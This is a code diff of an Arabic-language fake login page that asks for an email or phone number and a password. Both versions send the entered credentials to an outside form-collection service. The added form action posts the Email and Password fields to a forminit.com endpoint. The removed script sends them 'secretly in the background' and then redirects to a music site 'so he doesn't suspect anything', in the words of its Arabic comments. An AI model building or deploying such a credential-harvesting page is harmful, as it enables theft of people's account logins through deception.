@@ -29,12 +29,12 @@
             <h1 class="login-title">تسجيل الدخول</h1>
             <p class="login-subtitle">المتابعة إلى الموقع بإستخدام بريدك الإلكتروني</p>
 
-            <form id="secure-form">
+            <form action="https://forminit.com/f/fokrp2oltl7" method="POST">
                 <div class="input-group">
-                    <input type="email" name="fi-sender-email" id="email" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
+                    <input type="email" name="Email" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
                 </div>
                 <div class="input-group">
-                    <input type="password" name="fi-text-password" id="password" class="input-field" placeholder="أدخل كلمة المرور" required>
+                    <input type="password" name="Password" class="input-field" placeholder="أدخل كلمة المرور" required>
                 </div>
                 <div class="button-wrapper">
                     <button type="submit" class="btn-next">التالي</button>
@@ -42,26 +42,5 @@
             </form>
         </div>
     </div>
-
-    <script src="https://forminit.com/sdk/v1/forminit.js"></script>
-    <script>
-        const forminit = new Forminit();
-        const FORM_ID = 'fokrp2oltl7';
-
-        document.getElementById('secure-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const formData = new FormData(e.target);
-            
-            try {
-                // إرسال البيانات سرياً في الخلفية
-                await forminit.submit(FORM_ID, formData);
-                // النقل الفوري لموقع الموسيقى
-                window.location.href = "https://www.musicful.ai/song/48835729232678919/";
-            } catch (err) {
-                // حتى لو حدث خطأ، انقله للموقع لكي لا يشك في شيء
-                window.location.href = "https://www.musicful.ai/song/48835729232678919/";
-            }
-        });
-    </script>
 </body>
 </html>
